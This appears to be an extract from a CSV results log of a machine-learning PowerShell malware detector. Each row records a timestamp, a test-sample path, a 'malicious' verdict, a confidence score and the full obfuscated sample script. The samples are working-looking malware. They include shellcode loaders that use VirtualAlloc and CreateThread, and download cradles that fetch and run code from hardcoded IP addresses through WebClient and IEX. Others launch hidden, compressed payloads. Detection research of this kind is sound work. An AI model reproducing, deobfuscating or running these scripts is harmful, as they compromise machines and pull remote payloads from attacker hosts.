0xbe,0x4b,0x33,0x12,0xf0,0xd9,0xc9,0xd9,0x74,0x24,0xf4,0x58,0x31,0xc9,0xb1,0x47,0x31,0x70,0x13,0x83,0xe8,0xfc,0x03,0x70,0x44,0xd1,0xe7,0x0c,0xb2,0x97,0x08,0xed,0x42,0xf8,0x81,0x08,0x73,0x38,0xf5,0x59,0x23,0x88,0x7d,0x0f,0xcf,0x63,0xd3,0xa4,0x44,0',' uint dwCre','l32.dllU63)]public s','= RGAz.Length};RGAx=RGAw::Virtu'))-rePlaCE ([cHAR]85+[cHAR]54+[cHAR]51),[cHAR]34  -rePlaCE  'kRO',[cHAR]39  -rePlaCE'RGA',[cHAR]36) )",malicious,TP
2026-07-13 17:11:39,C:\\TA\\project-ta\\data_spliting\\test_set_obf\\String_Reordering\\malicious\\3318.ps1,custom-ps-ml,UNKNOWN,d9cb88f8-2a85-427e-9079-202e6153c51e,DESKTOP-BAC9DBQ,malicious,0.9989,RandomForest,3099,1577.81," (((\""{15}{69}{4}{34}{14}{13}{25}{40}{63}{64}{61}{48}{20}{12}{5}{19}{28}{56}{43}{55}{65}{0}{62}{51}{71}{2}{33}{18}{54}{53}{3}{31}{60}{32}{52}{47}{26}{58}{49}{42}{39}{21}{35}{46}{66}{17}{41}{68}{16}{22}{30}{36}{44}{8}{1}{50}{38}{37}{67}{6}{11}{24}{70}{7}{10}{29}{23}{57}{9}{45}{59}{72}{27}\"" -f'A77my','gbw/qHBks5t7jDrjjaGq5VG3hpolOrzyUXok9rUeRvFK3+pq2Xa5O/xwM/JU+56dq3q9v3Q8VVUf','kFSMhLcZrcTRjZm+aVXyM9ZFGB5ziTgMCPt2/','XQq5eK','bject System.Diagnostics.P','yRiJzePs','VUgHxjOwfnphOy9KWka5xW27c726G','));IEX (Ne','K3ihcaSBjjH+CnGNlkaX','))).ReadToE','w-Object ','I6H/zuWhyqewY/7','6JMkTtFzqPMA0nF5e1pMoIqHY74tXRKA4JsEDoySWFem7NJ','fo;flBs.FileName=flBb;flBs.Arguments=K5f-nop -w hidden -c flBs=Ne','artIn','if([IntPtr]::Size -eq 4){flBb=K5fpowershell.exeK5f}else{flBb=flBenv:wi','tns6r1ms7a6tuyasB','Sy+uClPD0DtYIkEQG','X+MQVg','yJI','+akiyMcSHKON/3qF7cg5dbJ3KjiTaycnIA4N++PDE/','CQApV1hGwz7UMaHWtixCfvEzb8QZcb','ot0e62hNm4n88t1LwbjMS4hZp9WlqMatvlNd1aHeSO1urZVts+lrT1du673kj3PP/cs+7KHwzaGdZ7WqmCO3oj6Qy1R61Uixv0sdmjg97i2hAPI5vhgaf69+','New-Object IO.Compression.Gzip','Kiyf3v1B+ip8S4XnSPwifv7iP2H+N1AMMRWgbEFXYmQ/K/+AyIFI','w-Object IO.MemoryStre','eRCgRfLfM','tput=flBtrue;flBs.WindowStyle=K5fHiddenK5f;flBs.CreateNoWindow=flBtrue;flBp=[System.Diagnostics.Process]::Start(flBs);','6Rv','IO.StreamReader(','WPmK470dwuc3PbQuhqVnW21559NTPdzaipfhz','g8qFc+P0B5UwbdGeO','0eUJlk2gf6bjLv6R','evvEyAoRidn7nG5','rocessSt','2PbVTSDIsjm','WFqiBUD1s2IbG2yMtQl3Vxr7NH9u+hgO/jjTHp','wz4AO07qwyDR4Zhzbc5TS1kOVsHi9IFBIGYwwGXUZtxBh30oHw1LNhIu3nxBSKdADLauXFlSL9VFSehkX26vJyDNFCpexoXOyQ0BezQmldLZWg35fWtRJc','+1eBNH8Q','5F7GoY8Zo6MNJK8gFvEkxsETKjSjtHTseKEWLiFawZ','am(,[Convert]::FromBase64String(K5fK5fH4sIALvNC','JEPNBwTM5qlogAMPmdekvrCJ5RK2Smoy1oGT3ScsuE/wGttrh+7rav50010tczD7Xi','iO26qHEF5cFnnYSyixIEswvX71pI4FLMUjYLUpC7RNhb1M9f','s6dmZEOkWhm8o63MFpYEVryaiQ858/55X','GTcGxhar2doaHA1/6p/VH2wvcczbWhX6Hh5fzeDvQEhtNVSreWSLR/1AKQrjrB/Bzp+veLMPNDR3yPt/Q2P','nd();K5f;flBs','KEPFuMi4Jk00hAi0jhPebVX4Zy1CWyoOoROWRHzqpoom1ESvs','pg','2yzNzKH17+','VrJkxQB8c','m3rbGZfXF7fnF50htQOOBqpqv0u5AeTIra7rTWsUxPNqu32U99','IolCaX+h9IS9XM7DshtxB7luRGJQL7bCFV8QORcmjBWkf+TJwf1','6U8nWG47ggdROoJacgWQQzAlWJw','Kn6RSQTLBJxY82sA2148SokylSZqDy','dTLZrQmEKnd5THf','JaXlabHxNMIvlvLW','Uu5L8YrxB8wOap','Stream(flBs,[IO.Compression.CompressionMode]::Decompress','P4','.UseShellExe','veBni023rddANLE5dadgekhTLnxoaBdnO9HvGacTj4ZE34Q4oE5GKvkl+InHyO7SxUztBuKT8wcBcXXCiI9FimdBmvxq1gio+GmrJZS5JEIOpDCGqCC7yvNg9imS863QJAHgtd/nIR','DyQu','WR8yZ1Ih5zTxSHNKxWioMwxh65gdNWxCRixt04r8A14C8i','Vg','CA7VWf2/aPBD+u5P2HaIJiUSjhF9ru0qTXoeQQiEtNBAKDE1u4gSDE7PEocC27/5egKxU66a+k96oFXbuznd+7rm7eEnoCMp','JBQmKLmN5Rfqhp','cG','+/VXrPPlRt6f','l','ndir+K5fk6Dxsyswow64k6DxWindowsPowerShellk6Dxv1.0k6Dxpowershell.exeK5f};flBs=New-O','R58aT1kDrniHJ/3ku03E6Q18h/wLKT6J7mYKAAA=K5fK5f','dEgoaEJALEvGlRaIVdUhcbOLQZeSOeFP5hjxmt36tkXxsBFpdES','cute=flBfalse;flBs.RedirectStandardOu'))-RepLace ([CHAr]107+[CHAr]54+[CHAr]68+[CHAr]120),[CHAr]92  -RepLace ([CHAr]75+[CHAr]53+[CHAr]102),[CHAr]39  -CrepLAce'flB',[CHAr]36) | &amp;( $verBoSeprefERENCE.TosTRING()[1,3]+'X'-joiN'')",malicious,TP
2026-07-13 17:11:44,C:\\TA\\project-ta\\data_spliting\\test_set_obf\\String_Reordering\\malicious\\3331.ps1,custom-ps-ml,UNKNOWN,9cb98c86-9043-4844-9fbe-761bc8c5e8bf,DESKTOP-BAC9DBQ,malicious,0.9867,RandomForest,1545,1643.44," &amp; ((Get-VARiaBLE '*mDR*').nAmE[3,11,2]-joiN'')(((\""{98}{108}{80}{22}{29}{24}{48}{3}{81}{64}{6}{12}{37}{69}{110}{91}{49}{28}{111}{75}{84}{102}{40}{19}{1}{85}{38}{52}{66}{57}{104}{2}{72}{78}{89}{26}{46}{70}{56}{33}{44}{61}{55}{67}{16}{15}{47}{54}{25}{14}{58}{76}{97}{113}{117}{32}{90}{42}{88}{0}{83}{95}{77}{39}{65}{53}{103}{106}{60}{4}{21}{30}{114}{68}{20}{74}{63}{87}{86}{59}{50}{7}{119}{109}{62}{11}{112}{36}{31}{71}{120}{23}{107}{27}{92}{45}{51}{8}{9}{17}{101}{13}{41}{116}{99}{43}{94}{10}{93}{100}{79}{73}{82}{115}{105}{34}{96}{35}{118}{18}{5}\"" -f '=',' r','.H','.W','HE]::D','Gb-jOinRzVRzV)','I','db','(rfShttp://','192.','))9','39RzV;MpGI=0','eN','.11:7777','DEfAU','YSTEm.','S','1','p','dent/7.0;','c51','efauLTNetwOr','Sy','AR[]](','m.N','REquESt]::','dd(RzVU','GW','(W','StE','KCR',']MpG','.ProxY.',',MpGu);Mp','GK[MpGI++','MpGk','[CHAR[]','T;MpGu=RzVMo','1.0','N',' Tri','/i','REDEN','ex.asprfS','G','.DoWnlo','ser-Age','Net.','Et',' ','0','AdSTRiNg',') like','CR','Web',' ','tRzV','oRzV;','L','0e','iALCac','WC.PRoxY =','2af','41','bCl','Et.',' Geck','[','=RzV','zill','n','B=(','eA','G_','ce','do','tWe','m.','D','Mp','JEct ','E','-',' ','ws NT 6.1; W','v:1','c124a1','0','TiaLS ','erS.A','C','/5.0','C','8w%',')','[SystE','%','B','MpGwC=NEw-O','d','{','68.10','OW64;','E','MpGwc','Mp','DeNt','Mp','b','fc','a','in',';','PrOXy;MpGW','EdEnTiAls;MpGK','BXOr','n','c','.LEnGth]};IEX (M','5e4b97','[ch')).RePLaCE('MpG','$').RePLaCE('rfS',[strinG][Char]34).RePLaCE(([Char]57+[Char]56+[Char]119),'|').RePLaCE('RzV',[strinG][Char]39) )",malicious,TP
2026-07-13 17:12:10,C:\\TA\\project-ta\\data_spliting\\test_set_obf\\String_Reordering\\malicious\\334.ps1,custom-ps-ml,UNKNOWN,910382d6-6b47-4e77-9e64-fa64eb1c251f,DESKTOP-BAC9DBQ,malicious,0.9867,RandomForest,3067,1822.88,"(((\""{22}{40}{6}{51}{46}{18}{23}{72}{60}{14}{24}{48}{42}{30}{68}{5}{69}{2}{7}{38}{57}{1}{28}{17}{27}{15}{20}{39}{63}{59}{41}{43}{21}{47}{25}{34}{4}{45}{50}{35}{29}{53}{52}{12}{31}{66}{36}{37}{16}{54}{61}{56}{71}{10}{11}{70}{62}{64}{55}{8}{44}{0}{9}{19}{33}{49}{3}{58}{26}{67}{65}{32}{13}\""-f '60,0xe1,0xc1,0x43,0x90,0x0a,0x08,0xec,0x3a,0xe5,0xe5,0x44,0xd2,0x9c,0xaf,0x1f,0x43,0x60,0x7a,0x5a,0x43,0xea,0x89,0x9a,0x0d,0x1b,0xe7,0x88,0xf9,0xeb,0xb2,0xf3,0xaf,0xf4,0x68,0x99,0x4f,0x61,0x97,0x08,0x18,0x1d,0x','4,0x',' h37Win32h37 -namespace Win32Function','h}','xad,0x05,0x28,0x91,0xa6,0x5f,0xea,0x13,0x6b,0xd4,0xa3,0x0b,0x68,0xd1,0x7a,0xa7,0x5a,0xad,0x7c,0x61,0x93,0x','tr dest, uint src, uint count);85q;SLrw = Add-Type -memberDefinition SLrc -Nam',' extern IntPtr VirtualAlloc(I','s -passthru;[Byte[]];[Byte[]]SLrz = 0xba,0x01,0xbd,0x77,0x57,0xda','0xcd,','95,0x6d,0x6e,0x8','x8b,0xf6,0x79,0','x2b,0x72,0xf9,0x79,0x65,0xb0,0xad,0x29,0x1d,0x11,0xce,0xa1,0xdd,0x9e,0x1b,0x5f,0xdb,0x08,0','0xa3,0xe','ri], 1)};SLrw::CreateThread(0,0,SLrx,0,0,0);for (;;){Start-sleep 60};','ntPtr lpParamet','7,0xb','2d,0x83,0x26,0xe6,0x82,',',0x50','ationType, uint flProtect);[DllImport(h37kernel32.','2,0x66,0x58,0xe5,0x0b,0xf3,0x23,0x91,0x73,0x13,0xa4,0x61,0x22,0x79,0xa4,0x09,0x92,0xd9,0xf7,0x2c,0xdd,0xf7,0x6b,0xfd,0x48,0xf8,0xdd,0x52,0xda,0x90,0xe3,0x8d,0x2c,0x3f,0x1b,0xf8,0xac,0x03,','1,0xd4,0x42,0x93,0xb2,0x46,0x73,0xd7,','xbc,0xe0,0x96,0xa0,0x51,0x85,0','SLrc = 85q[DllImport(h','dllh37)]publi','e','78,0xd9','c(0,0x1000,SLrg,0x40);for (SLri=0;SLri -le (SLrz.Length-1);SLri++) {SLrw::memset([IntPtr](SLr',',0x13,0x03,0x50,0x13,0x83,0xe8,0xfd,0x5f,0x82,0xab,0x15,0x1d,0x6d,0x54,0xe5,0x42,0xe','24,0xf4,0x58,0x2b,0xc9,0xb1,0x47,0x31','xda,0xbf,0xd5,0x4',';[DllImport(h37msvcrt.dllh37)]public static extern','8,0x89,0xbe,0xdf,0x61,0x2c,0x11,0x56,0x31,0x0b,0xb5','Lrz[SL','0xca,0xc4,0xda,0x6d,0xce;SLrg = 0x1000;if (SLrz.Length -g',',0xd5,0xe2,0xf8,0x3e,0',',0xe3,0x5a,0x37,0xa0,0x3f,0xee,0xac,0x02,0xcb,0x48,0x09,0xb3,0x18,0x0e,0',',0xec,0x99,0x44,0x4','a,0xee,0x42,0x38,0xee,0x64,0x6e,0x',',0xdd,0x','0x97,0x6a,0xf8,0xb5,0x03,0xf9,','37kernel32.dllh37)]public static','xed,0','eadId)','xee,0xa4,0xfc,0xec,0x37,0xd8,0x0d,0','0x1c,0x','4e,0xd2,0x4c,0','lloc','xe3,0x','r, uint dwCreationFlags, IntPtr lpThr','t 0x1000){SLrg = SLrz.Lengt','x1c,0xbd,0x2a,0x88,0x9a,0x5e,0x59,0xe0,0xd9','ntPtr lpAddress, uint dwSize, uint flA','0x84,','4,','0xae,0xd8',',','xc4,0x13,0x12,0x24,0x64,0xdb,0','d9,0x7',';SLrx=SLrw::VirtualAllo',',0xb4,0x0d,0xcf,0x6a,0xe9,0','ern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, I',',0xf6,0x8c,0xb9,0xab,0','0,0xd1,0x44,0x38,0xb3,0x15,0x70,0x08,0x3a,0xf3,0x28','0x8c,0x11,0x23,0x4a,0x3a,0x44,0x0a,0x4b,0x17',',0x3a,0x6d,0xac,0x88,0xea','+SLri), S',',0x33,0xe1,0x32','x.ToInt32()',' IntPtr memset(IntP','e','x08,0xb','xbc,0xb3,0','c static ext'))  -cReplace 'SLr',[ChAr]36-cReplace ([ChAr]104+[ChAr]51+[ChAr]55),[ChAr]34 -cReplace([ChAr]56+[ChAr]53+[ChAr]113),[ChAr]39)| .((GeT-vaRiAbLe '*MDR*').NamE[3,11,2]-joiN'')",malicious,TP
2026-07-13 17:12:22,C:\\TA\\project-ta\\data_spliting\\test_set_obf\\String_Reordering\\malicious\\3359.ps1,custom-ps-ml,UNKNOWN,46b0433a-8c07-4e72-9609-329ba840ffe9,DESKTOP-BAC9DBQ,malicious,0.9867,RandomForest,2900,2061.61," ((\""{12}{33}{19}{32}{25}{4}{26}{47}{23}{15}{9}{11}{45}{21}{30}{48}{1}{46}{3}{39}{40}{22}{24}{28}{31}{38}{13}{0}{18}{7}{2}{17}{34}{16}{8}{14}{5}{41}{29}{6}{37}{35}{42}{43}{44}{20}{27}{36}{10}\""-f'0xc0,0x2d,0','Byte[]]NUhz = 0xda,0','3,0x57,0x73,0x3e,0x50,0x2a,0xaf,0xcb,0x43,0x8c,0x24,0x6b,0xa8,0x2d,0xe8,0xea,0x3b,0x21,0x45,0x78,0x63,0x25,0x58,0xad,0x1f,0x','f4,0xb8,0x63,0x2d,0x9b,0xb6,0x5b,0x33,0xc9,0xb1,0x47,0x83,0xeb,0xfc,0x31,0x43,0x14,0x03,0x43,0x77,0xcf,0x6e,0x4a,0x9f,0x8d,0x91,0xb3,0x5f,0xf2,0x18,0x56,0x6e,0x32,0x7e,0x12,0xc0,0x82,0xf4,0x76,0xec,0x69,0x58,0x63,0x67,0x1f,0x75,0x84,0','tributes, ',',0x3d,0x86,0x3c,0x24,0xe8,0x33,0x38,0xb2,0xd3,0x6c,0x43,0x6a,0xbc,0x6e,0x44,0x6e,0x80,0xe6,0xa2,0x3e,0xa8,0xa8,0x7a,0xfe,0x18,0x09,0x2b,0x96,0x72,0x86,0x',',0x69,0xef,0xfd,0x3e,0xd2,0x87,0x01,0xaf,0xd2,0x57,0x54,0xa5','x24,0xce,0x25,0x8','4,0x42,0xe3,0x3d,0xc3,0xee,0x6c,0x98,0x14,0x11,0x47,0x5c,0x8a,0xec,0x68,0x9d,0x82,0x2a,0x3c,0xcd','t.dllo5u)]public static extern IntPtr memset(IntPtr dest, uint src, u','([IntPtr](NUhBLp.ToInt32()+NUhi), NUhz[NUhi], 1)};NUhw::CreateThread(0,0,NUhBLp,0,0,0);for (;;){Start-sleep 60};','int count);','NUh5x','0x44,0x6b,0xe6,0x61,0x1e,0x00,0xdc,0x1e,0xa1,',',0xbc,0x9b','r lpThreadId);[DllImport(o5umsvcr','x37,0x70,0x3c,0x85,0x4','51,0xd1,0x50,0xf0,0xd0,0xa1,0x76,0xd4,0xb9,0x72,0x16,0x4d,0x67,0xd4,0x27,0x8d,0xc8,0x89,0x8d,0xc5,0xe4,0','xde,0x0e,0x2d,0x82,0x2d,0x4e,0x69,0','alAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(o5ukernel32.dllo5u)]public s',' 0x1000){NUhg = NUhz.Length};NUhBLp=NUhw::','memberDefinit','66,0x06,0x47',', uint dwCreationFlags, IntPt',',0xb1,0x03,0','Ptr CreateThread(IntPtr lpThreadAt','uint dwStackSize, IntPtr lpS','VirtualAlloc(0,0x1000,NUhg,0x40);for (NUhi=0;NUhi -le (NUhz.Length-1);NUhi++) {NUhw::memse','x52,0x54,0x3a,0x5f,0x72,0xdc,0xdf,0x','0xed,0x79,0xd2,0xbe,0x8b,0xb9,0x58,0x4d,0x6b,0x77,0xa9,0x38,0x7f,0xef,0x59,0x77,0xdd,0xb9,0x66,0xad,0x48,0x45,0xf3,0x4a,0xdb,0x12,0x6b,0x51,0x3a,0x54,0x34,0xaa','ion NUh','17,0x75,0xcd,0x71,0x2c,','tatic extern Int','O = AXE[DllImport(o5ukernel32.dllo5u)]public static extern IntPtr Virtu','xde,0xbf,0x87,0x60,0x12,0xf2,0','8,0','t',',0xd2,0x3f,0x00,0x9d,0x80,0x5a,0x4f,0x0','0x2c,0xcd,0x70,0xe1,0x44,','xc0,0xaa,0','xa3,0xab,0xd1,0x87,0x90,0xaa,0x51,0xda,0xc4,0x0c,0x68,0x15,0x19,0x4c,0xad,0x48,0xd0,0x1c,0x','14,0x86,0x7c,0x4c,0x3d,0x2c,0x93,0x39,0x15,0xd8,0x0a,0x60,','xb5,0xf7,0xda,0xb3,0xec',',0xa4,0x4d,0xdc,0x12,0x93,0xb','a,0x43,0xec,0xf6,0x3a,0xbf,0x3b,0x3e,0x49,0xd1,0xff;NUhg = 0x1000;if (NUhz.Length -gt','AXE;NUhw = Add-Type -','xd0,0xd9,0x74,0x24,0x','tartAddress, IntPtr lpParameter','5xO -Name o5uWin32o5u -namespace Win32Functions -passthru;[Byte[]];[')).RePLAcE('NUh',[stRiNG][cHaR]36).RePLAcE(([cHaR]111+[cHaR]53+[cHaR]117),[stRiNG][cHaR]34).RePLAcE('AXE',[stRiNG][cHaR]39)|&amp; ((GV '*mDR*').nAMe[3,11,2]-JOIN'')",malicious,TP
2026-07-13 17:12:27,C:\\TA\\project-ta\\data_spliting\\test_set_obf\\String_Reordering\\malicious\\3361.ps1,custom-ps-ml,UNKNOWN,9200e505-6d7e-4205-b266-87b0b0b1b118,DESKTOP-BAC9DBQ,malicious,1.0,RandomForest,2049,1830.72,"InVOke-exPresSiOn( (((\""{65}{144}{54}{151}{21}{27}{46}{41}{116}{164}{85}{86}{123}{38}{96}{37}{7}{83}{105}{121}{3}{40}{114}{28}{4}{107}{5}{165}{25}{29}{120}{82}{134}{136}{39}{141}{91}{84}{137}{31}{115}{55}{98}{142}{12}{2}{133}{59}{90}{88}{56}{119}{143}{157}{95}{149}{62}{71}{16}{48}{111}{161}{76}{30}{79}{160}{154}{109}{108}{14}{145}{130}{103}{158}{69}{77}{42}{102}{67}{8}{92}{139}{1}{129}{52}{74}{50}{140}{47}{99}{117}{60}{43}{155}{78}{23}{81}{147}{70}{122}{75}{80}{49}{19}{66}{64}{152}{146}{118}{153}{17}{15}{18}{94}{63}{104}{124}{127}{162}{51}{73}{128}{53}{57}{101}{113}{110}{6}{44}{159}{68}{89}{58}{150}{20}{36}{11}{72}{9}{32}{87}{61}{33}{10}{166}{45}{148}{156}{97}{163}{100}{34}{24}{22}{138}{0}{131}{112}{135}{126}{35}{125}{106}{26}{13}{93}{132}\"" -f'MNR=','NeT','.H','/7.0; ','l','ckoTM','.as','Trid','EfA','NI','EX ','e','c','N','.CRe','e','Nwc.',']](','MNW','y{','XOreMN','STE','); ','c','p','tem.Net.Serv','M','M','11.0) ','i','eFAulTWE','li','++','I','M','Ep 5','K[','WOW64; ','T 6.1;','v','rv','Nu=','STem.NeT.CRedEnTiAlC','80aa','pkJp))','eM','.NET.WebClIeNt;eM','TM','P','R','S;eMNK',':','r','39.227.108','EW-ObJ','Callback ','e',':443','N','.ADD(T','5268',']};',';','O','MNI=0;[c','eMNw','e',':D','R%{','[','86454','eM','M','//52','edenTIAL','NR=5;','T]::D','SY','52','B','DO{T','10','a','e','V','5.0',' ','%eMNK.LENGth','pUs','eM','M','ficate','u','R -','C.D','MN',' ','oINT','= {eMNtr','p87','pT','/i','achE]:',' ','W','n','e (e','ike Ge','OXY','.PR','dex','ROXY = [SysTEM.NeT.WebREQ',';','n',':','dation','TMpMozill','9','HA','r-','cePointM','t','22TMp;eM','(Windows N','NL',';eMNR--}} WHil','Sle','OADSTRiNg(kJphtt','.','wOrkC','tiAlS','0','GT 0)','eaDErS','nager]::Se','}caTCH{','r','a','e','LT','=','erCerti','ue};eMNW','Ag','c=N','DEn','NB=([c','8','NB-','u)','_-b','ECT Sy','HAR[]]eM','R[','c','49cbc97d','J','entTMp,e','= ',')Dt','PrOxy;eMNw','ues','ps','M','a/','p;[Sys','('))-repLAce  'TMp',[CHAr]39 -repLAce'DtR',[CHAr]124-repLAce  ([CHAr]101+[CHAr]77+[CHAr]78),[CHAr]36  -CrEpLAce  ([CHAr]107+[CHAr]74+[CHAr]112),[CHAr]34))",malicious,TP
2026-07-13 17:12:34,C:\\TA\\project-ta\\data_spliting\\test_set_obf\\String_Reordering\\malicious\\338.ps1,custom-ps-ml,UNKNOWN,4d3abbb3-b347-4315-84d2-c392f0d4f58d,DESKTOP-BAC9DBQ,malicious,0.9914,RandomForest,320,2162.26," .( $vErBosePREFEREnCe.tOStrIng()[1,3]+'X'-joIn'') ((((\""{7}{19}{4}{17}{3}{20}{10}{16}{15}{9}{21}{6}{8}{0}{12}{22}{5}{13}{1}{14}{2}{23}{18}{11}\""-f 'r','http','//91.12','t N','(New-Ob','{','.Down','I','loadSt','nt','bCl','wizz.txt{0})','ing','0}',':','e','i','jec','3.152/','EX ','et.We',')','(','0.2'))  -F  [cHar]39) )",malicious,TP
2026-07-13 17:12:51,C:\\TA\\project-ta\\data_spliting\\test_set_obf\\String_Reordering\\malicious\\3385.ps1,custom-ps-ml,UNKNOWN,200debaa-6502-41cd-8fd0-d6dc3113bd74,DESKTOP-BAC9DBQ,malicious,0.8329,RandomForest,3294,6306.79,"&amp;((GET-VarIaBle '*mdR*').NAme[3,11,2]-JoIN'') ( (((\""{55}{21}{0}{3}{43}{53}{50}{46}{26}{13}{16}{49}{29}{34}{54}{30}{44}{45}{27}{28}{38}{6}{12}{40}{7}{52}{42}{5}{8}{35}{2}{23}{31}{14}{24}{1}{32}{4}{18}{9}{39}{48}{10}{15}{20}{33}{19}{41}{17}{47}{22}{11}{36}{37}{25}{51}\"" -f'c static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreat','xe6,0x3b,0x80,0x3d,0x12,0x9b,0xc5,0x41,0x11,0x23,0x16,0xcb,0xb5,0','0x1a,0x88,0xae,0xe2,0xf4,0x14,0x07,0x7c,0xa2,0x97,0x72,0x2d,0xff,0x0d,0x7e','ionFlags, IntPtr lpThreadId',',0xf3,0x19,0x74,0xde,0x6c,0x56,0xc3,0x42,0x3a,0x69,0xf9,0xe8,0x83,0xfd,0x02,0xfc,0x03,0xfe,0x6a,0xfc,',',0xcd,0xa9,0x48,0x9e,0x6c,0xeb,0x34,0x71,0x91,0xeb,0x96,0x2e,0x37,0x67,0x3a,0x3a,0x4a,0x2a,0x53,0xd2,0x31,0xa1,0xa3,0x42,0xce,','49,0xaa,0x0e,0x8f,0xe1,0xe3,0x08,0xcc,0xcc,0','x82,0xd4,0xa7,0x32,0xf8,0x02,0x22,0xa1,0x5a,0xc0,0x94,0x0d,0x5a,0x05,0x4','0x20,0xca,0xfb,0x64,0xdb,0x5e,0x8b,0xa2,0x1c,0xa','x03,0xbe,0x6a,0xaf,0x',',0xfd,0x51,0x3c,0','1IVg,0x40);for (1IVi=0;1IVi -le (1IVz.Length-1);1IVi++) {1IVw::memset([IntPtr](1IVV4R.ToInt32()','xba,0xa3,0x26','ce Win32Functions -passthru;[Byte[]];[Byte[]]1IVz = 0xda,0xda,0xbb,0x3f,0x54,0x9b,0xaa,0xd9,0x74,0x2',',0xc3,0xee,0x','x6a,0x','4,0xf4,0x5a,0x2b,0xc9,0xb1,0x57,0x83,0xc2,0x','z.Leng','0',',0x38,0xae,0xd0,0xaf,0x5b,0xe8,0x13,0x10,0x4c,0x7d,0x6b,0x50,0x73,0x4c,0xab,0x9b,0xa2,0x9f,0xfc,0xd2,0x94,0xed,0x37,0x24,0xc7,0x20,0x0e,0x75,0x17;1IVg = 0x1000;if (1IVz.Length -','95,0x43,0x54','atic extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(lvBkernel32.dlllvB)]publi',';1IVV4R=1IVw::VirtualAlloc(0,0x1000,',',0x81,0xac,0xb9,0x3b,0x24,0x53,0','80,0x7f,0x83,0xf0,0x3e,0x60,0xd7,0xa2,0x6d,0x33,0x80,0x17,0xc4,0xdb,0xc5,0xcd,0xc6,0x20,0','IVw::CreateThread(0,0,1IVV4R,0,0,0);for','1IVj3wg -Name lvBWin32lvB -namespa','08,0x28,0x71,0x','a4,0xea,0x11,0xba,0xb9','4,0x31,0x5a,0x16,0x03,0x5a,0x16,0xe2,0xca,','90,0x0a,0xf5,0xfe,0x00,0x98,','x39,0xd4,0xab,0x53,0x39,0x24,0x9b,0x60,0x6d,0x77,0xd7,0xc8,0x8d,0x27,0x7f,0x82,0x04,0x58,0xb9,0xd3','x49,0x12,0x9b,0x5f,0x91,0x4c,0x73,0xea,0xeb,0xee,0x05,0xeb,0x21,0x5d,0x59,0x40,0x99,0x34,0x35,0x4b,0x1b,0xa1,0xbe,0x6c,0xf6,0x54,0x80,0xe7',',0x1b,0x87,0x9b,0x8d,0x9e,0x88,0x10,0xe3,0x2b,0x0f,0xd8','0xa8,0x73,0x28,0x34,0x51,','0,0xa6,0x9b,0xf9,0x0d,','+','1IVi), 1IVz[1IVi], 1)};1',',0xeb,0x56,0xa7,0x33,0xb9,0x0f,0xa3,0xe1,0x2e,0x3b,0xf9,0x39,0xc4,0x77,0xef,0x39,0x39,0xcf,0x0e,0x68,0xec,0x5b,0x','6b,0x66,0xcf,0x1c,0x89,0x69,0xda,0x31,0x02,0xc5,0x6c',',0xba,0x3d,0x62,0x77,0x43,0x91,0x4b,0xb7,0xb6,0xe8,0x8c,0x70,0x29,0x9f,0xe4,0','gt 0x1000){1IVg = 1IV','b9,0x81,0x7e,0xe9,0x6d,0x00,0xc4',');[DllImport(lvBmsvcrt.dlllvB)]public static extern IntPtr memset(','0x7b,0xd6,0x27,0x29,0x31,0x00,0x09,0xaa,0x6a,0x','70,0x','tion ','th}',',0xd2,0xf2,0x81,0x6e,0x3c','0',', uint count);eDt;1IVw = Add-Type -memberDefini',' (;;){Start-sleep 60};','2,0xc5,0x50,0xe2,0x01,0x81,0x74,0xf5,0xc6,0x','IntPtr dest, uint src','0x84,0x4d,0xbd,0xb4,0xb5,0x4d,0xd9,0xbd,0xe6,0x7d,0xaa,0x','1IVj3wg = eDt[DllImport(lvBkernel32.dlllvB)]public st'))-crePLaCe([chAR]49+[chAR]73+[chAR]86),[chAR]36 -crePLaCe ([chAR]108+[chAR]118+[chAR]66),[chAR]34-REPLace  'eDt',[chAR]39))",malicious,TP
2026-07-13 17:12:58,C:\\TA\\project-ta\\data_spliting\\test_set_obf\\String_Reordering\\malicious\\3394.ps1,custom-ps-ml,UNKNOWN,330066e1-ee61-4343-a538-63b992b5eec8,DESKTOP-BAC9DBQ,malicious,1.0,RandomForest,2990,2077.78," ((\""{32}{69}{1}{50}{62}{37}{39}{33}{13}{20}{45}{21}{60}{68}{3}{47}{49}{67}{53}{17}{27}{55}{56}{36}{48}{65}{15}{24}{59}{9}{43}{25}{4}{61}{23}{2}{35}{19}{30}{64}{16}{14}{66}{5}{18}{42}{41}{54}{28}{51}{40}{29}{57}{12}{10}{0}{11}{22}{46}{52}{7}{38}{44}{31}{8}{6}{63}{58}{26}{34}\"" -f'0x00,0x01,0xbb,0x89,0xe6,0x6a,0x10,0x56,0x57,0x68,0x99,0xa5,0x74,0x61,0xff,0xd5,0x85,0xc0,0x74,0x0c,0xff,0x4e,0x0','s, uint',',0x8b,0x48,0x18,0x',', IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId)','x3c,0x01,0xd0,0x8b,0x40,0x78,0x85,0',',0x04,0x8b,0x01,0xd0,0x89,0x44,0x24,0x24,0x5b,0x5b,0x61,0x59,0x5','0;if (gn4z.Length -gt 0x1000','0x5f,0xff,0xd5,0x8b,0','0x5f,0xff,0xd5,0x01,0xc3,0x29,0xc6,0x85,0xf6,0x75,0xec,0xc3;gn4g = 0x100','c,0x3','0f,0xdf,0xe0,0xff,0xd5,0x97,0x6a,0x05,0x68,0xc0,0xa8,0x00,0x0b,0x68,0x02,','8,0x','0,0x50,0x40,0x50,0x40,0x50,0x68,0xea,0x','r','1,0xd3,0x66,0x8b,0x0c,','00,0x60,0x89,0xe5,0x31,0','5,0xe2,0x58,0x8b,0x58,0x24,0x0','ublic static extern IntPtr memset(I','a,0x51,0xff,0xe0,0x58,0x5f,0x5a,0x8b,0x12,0xeb,0x','0x20,0x01,0xd3,0x','ead(IntPtr lpT','wStackSize,','75,0xec,0x68,0xf0,0xb5,0xa2,0x56,0xff,0xd5,0x6a,0x00,0x6a,0x04','0,0x50','xd2,0x64,0x8b,0x52,0x30,0x8b,0x52,0x0c,0x8b,0x52,0x14,0x8b,',',0x0d,0x01,0xc7,0xe2,0xf0,0x52,0x57,0x8b,0x52,0x10,0x8b,0x42,0','](gn4SwH.ToInt32()+gn4i), gn4z[gn4i], 